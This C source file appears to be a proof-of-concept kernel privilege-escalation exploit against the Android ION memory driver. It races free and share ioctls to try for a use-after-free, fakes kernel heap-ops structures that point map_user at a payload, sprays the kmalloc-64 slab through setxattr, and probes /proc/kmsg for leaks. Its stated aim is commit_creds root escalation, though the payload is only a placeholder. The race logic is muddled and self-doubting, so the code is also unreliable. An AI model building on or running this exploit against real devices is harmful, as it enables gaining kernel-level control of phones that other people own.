#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <sys/xattr.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <pthread.h>
#include <unistd.h>
#include <errno.h>

#define ION_IOC_MAGIC 'I'
#define ION_IOC_ALLOC _IOWR(ION_IOC_MAGIC, 0, struct ion_allocation_data)
#define ION_IOC_FREE _IOWR(ION_IOC_MAGIC, 1, struct ion_handle_data)
#define ION_IOC_SHARE _IOWR(ION_IOC_MAGIC, 4, struct ion_fd_data)

struct ion_allocation_data {
    size_t len;
    size_t align;
    unsigned int heap_id_mask;
    unsigned int flags;
    int handle;
};

struct ion_handle_data {
    int handle;
};

struct ion_fd_data {
    int handle;
    int fd;
};

// Fake kernel structures (simplified for POC)
struct fake_ion_buffer {
    void *ref;
    void *node;
    void *dev;
    size_t size;
    unsigned int flags;
    void *priv_virt;
    void *lock;
    int kmap_cnt;
    void *vaddr;
    void *sg_table;
    void *pages;
    void *vmas;
    void *heap; // Points to fake_heap
    void *map;
};

struct fake_ion_heap {
    void *ops; // Points to fake_heap_ops
    int type;
    int id;
    const char *name;
    void *priv;
};

struct fake_heap_ops {
    void *allocate;
    void *free;
    void *phys;
    void *map_dma;
    void *unmap_dma;
    void *map_kernel;
    void *unmap_kernel;
    void *map_user; // TARGET: Points to shellcode
};

// Global variables for race
int ion_fd;
int shared_fd = -1;
int victim_handle = -1;
volatile int race_start = 0;
volatile int race_stop = 0;

void *thread_free(void *arg) {
    while (!race_start);
    // Busy wait to sync with other thread better?
    for (volatile int i=0; i<1000; i++); 
    struct ion_handle_data data = { .handle = victim_handle };
    ioctl(ion_fd, ION_IOC_FREE, &data);
    return NULL;
}

void *thread_share(void *arg) {
    while (!race_start);
    // Try to hit right when free happens
    // No delay
    struct ion_fd_data data = { .handle = victim_handle };
    if (ioctl(ion_fd, ION_IOC_SHARE, &data) == 0) {
        shared_fd = data.fd;
    }
    return NULL;
}

// Shellcode payload (commit_creds(prepare_kernel_cred(0)))
// This is just a placeholder; in a real exploit, this would be assembly
void payload(void) {
    printf("[+] Kernel Execution Achieved! (User space payload running)\n");
    // In real exploit: commit_creds(prepare_kernel_cred(0));
}

#include <sys/socket.h>
#include <sys/un.h>

// Heap Spray Parameters
#define SPRAY_COUNT 2000
#define SPRAY_SIZE 96

#include <sys/syscall.h>
#include <unistd.h>

void spray_heap() {
    char payload[128];
    memset(payload, 0x41, sizeof(payload));

    int fd = open("/data/local/tmp/spray_file", O_CREAT | O_RDWR, 0644);
    if (fd < 0) {
        fd = open("spray_file", O_CREAT | O_RDWR, 0644);
    }
    
    if (fd >= 0) {
        unlink("/data/local/tmp/spray_file"); // Cleanup
        
    // Spray size tuning to avoid excessive modem corruption
    // Modem messages are ~24 bytes. Struct ion_handle is small.
    // Try to be more precise with spray size to target kmalloc-64 specifically.
    int sizes[] = {64}; // Only target kmalloc-64 where ion_handle lives

        
        printf("[*] Spraying using setxattr...\n");
        for (int s = 0; s < 1; s++) {
            int size = sizes[s];
            for (int i = 0; i < 500; i++) {
                char key[32];
                snprintf(key, sizeof(key), "user.s%d_%d", size, i);
                if (fsetxattr(fd, key, payload, size, 0) < 0) {
                     // Check for common errors
                     if (errno == EOPNOTSUPP) {
                         printf("[-] setxattr not supported on this FS\n");
                         close(fd);
                         return;
                     }
                     if (errno == EACCES || errno == EPERM) {
                         printf("[-] setxattr denied (SELinux?)\n");
                         close(fd);
                         return;
                     }
                }
            }
        }
        close(fd);
        printf("[*] Spray complete.\n");
    } else {
        perror("[-] Failed to create spray file");
    }
}

int main() {
    printf("[*] Setting up ION Exploit POC with Heap Spray...\n");
    
    // 1. Setup Fake Objects in User Space
    struct fake_heap_ops *fake_ops = malloc(sizeof(struct fake_heap_ops));
    struct fake_ion_heap *fake_heap = malloc(sizeof(struct fake_ion_heap));
    struct fake_ion_buffer *fake_buffer = malloc(sizeof(struct fake_ion_buffer));
    
    memset(fake_ops, 0, sizeof(struct fake_heap_ops));
    fake_ops->map_user = &payload; // Point to our payload
    
    fake_heap->ops = fake_ops;
    fake_buffer->heap = fake_heap;
    
    printf("[*] Fake Heap Ops at %p\n", fake_ops);
    printf("[*] Fake Heap at %p\n", fake_heap);
    printf("[*] Fake Buffer at %p\n", fake_buffer);
    
    // 2. Open ION
    ion_fd = open("/dev/ion", O_RDONLY);
    if (ion_fd < 0) {
        perror("[-] Failed to open /dev/ion");
        return 1;
    }
    
    printf("[*] Starting race loop...\n");
    int attempt = 0;
    
    // Check for modem logs by reading /proc/kmsg? 
    // Usually restricted. But we can check if open succeeds.
    int kmsg_fd = open("/proc/kmsg", O_RDONLY | O_NONBLOCK);
    if (kmsg_fd >= 0) printf("[+] Opened /proc/kmsg (can monitor leaks)\n");

    while (shared_fd < 0) {
        attempt++;
        if (attempt % 100 == 0) {
            printf(".");
            // Occasionally check kmsg if open
            if (kmsg_fd >= 0) {
                char buf[1024];
                int n = read(kmsg_fd, buf, sizeof(buf)-1);
                if (n > 0) {
                    buf[n] = 0;
                    if (strstr(buf, "mif:")) {
                        printf("\n[!] MODEM LOG LEAK DETECTED: %s\n", buf);
                    }
                }
            }
        }
        
        // Reset state
        victim_handle = -1;
        race_start = 0;
        
        // Allocate
        struct ion_allocation_data alloc = {
            .len = 4096,
            .align = 0,
            .heap_id_mask = (1 << 1), // Try Heap 1 (likely System Contig or other) to avoid Modem (Heap 0)
            .flags = 0
        };
        
        if (ioctl(ion_fd, ION_IOC_ALLOC, &alloc) < 0) {
            // Handle exhaustion? Try to clean up or just fail
            // perror("[-] Allocation failed");
            // continue; 
            // If alloc fails, we probably leaked too much or device is unstable.
            // For POC, let's just exit if it fails hard.
             perror("[-] Allocation failed");
             return 1;
        }
        victim_handle = alloc.handle;

        // Create threads
        pthread_t t1, t2;
        pthread_create(&t1, NULL, thread_free, NULL);
        pthread_create(&t2, NULL, thread_share, NULL);
        
        // Trigger
        race_start = 1;
        
        // Wait for threads
        pthread_join(t1, NULL);
        pthread_join(t2, NULL);
        
        // Check if we actually won the UAF race.
        // If shared_fd is valid, it means share succeeded.
        // If free also succeeded, handle is gone from client rbtree.
        // BUT if refcount > 0, handle is still alive in kernel heap.
        // We need refcount to hit 0 BEFORE share increments it? 
        // No, if refcount hits 0, share fails (kref_get_unless_zero).
        // 
        // The ONLY way UAF happens is if 'share' gets a pointer, 
        // then 'free' destroys the object (ref -> 0), 
        // then 'share' uses the pointer (UAF).
        // 
        // This requires 'share' to check refcount LATER?
        // Or 'share' not to check refcount at all?
        // 
        // If we get here and mmap succeeds, it likely means we just have a valid handle.
        // We need to loop until mmap FAILS or crashes?
        // 
        // Let's try to verify if handle is really freed.
        // We can't easily from userspace.
        
        if (shared_fd >= 0) {
            // We got an FD. 
            // Is it a UAF FD?
            // If we spray and it crashes, yes.
            // If we don't crash, maybe it's valid.
            // 
            // Let's retry the race if we didn't crash?
            // But we can't detect crash in same process (it kills us).
            // 
            // We can try to modify the loop to be more aggressive?
            // Or add a delay in one thread to shift the window?
            
            close(shared_fd);
            shared_fd = -1;
            // close(ion_fd); // Don't close ion_fd
            // continue;
        }
    }
    
    // 5. Heap Spray (Overwrite freed handle)
    printf("[*] Spraying Heap to overwrite freed handle with 0x41414141...\n");
    spray_heap();
    
    // 6. Trigger Execution
    printf("[*] Triggering execution via mmap()... Expect CRASH at 0x41414141 if successful.\n");
    void *ptr = mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_SHARED, shared_fd, 0);
    if (ptr == MAP_FAILED) {
        perror("[-] mmap failed");
    } else {
        printf("[+] mmap succeeded! Pointer: %p\n", ptr);
        printf("[+] Writing to buffer via dangling fd...\n");
        *(int*)ptr = 0x41414141; // Write to verify
    }
    
    return 0;
}
